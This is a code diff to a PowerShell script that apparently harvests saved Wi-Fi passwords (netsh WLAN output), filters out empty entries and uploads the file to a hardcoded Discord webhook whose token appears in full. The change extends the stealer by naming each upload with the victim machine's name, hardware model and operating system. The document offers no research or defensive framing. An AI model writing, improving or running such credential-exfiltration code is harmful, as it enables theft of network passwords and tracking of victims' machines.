@@ -159,11 +159,28 @@ Start-Sleep -Seconds 1.8
 # (Unmodified section below)
 
 $WebhookURL = "https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"
-
 if (Test-Path $outFile) {
     Write-DebugLog "File exists. Preparing to filter and send to Discord."
     $FilteredLines = Get-Content $outFile | Where-Object { $_ -ne "PASS: <No password saved or open network>" }
-    $TempUploadFile = "$env:TEMP\wlan_clean_$(Get-Date -Format 'yyMMddHHmmssffff').txt"
+
+    # Build temp upload file name with date, computer, model, OS
+    $computer   = $env:COMPUTERNAME
+    $cs         = Get-CimInstance Win32_ComputerSystem
+    $model      = ($cs.Model).Trim()
+    $osObj      = Get-CimInstance Win32_OperatingSystem
+    $osCaption  = ($osObj.Caption).Trim()
+    $date       = Get-Date -Format 'MMM dd'
+
+    $parts = @($date, $computer, $model, $osCaption)
+    $invalidChars = [IO.Path]::GetInvalidFileNameChars()
+    $sanitized = $parts | ForEach-Object {
+        $s = $_.ToString().Trim()
+        foreach ($c in $invalidChars) { $s = $s -replace [regex]::Escape($c), '_' }
+        $s
+    }
+
+    $TempUploadFile = Join-Path $env:TEMP ( ($sanitized -join ' - ') + ' - netshreport.txt' )
+
     $FilteredLines | Set-Content -Path $TempUploadFile -Encoding UTF8
     try {
         $boundary = [System.Guid]::NewGuid().ToString()
@@ -187,6 +204,7 @@ if (Test-Path $outFile) {
         }
     }
 }
+
 
 if ($DebugMode) {
     if (Test-Path $outFile) {
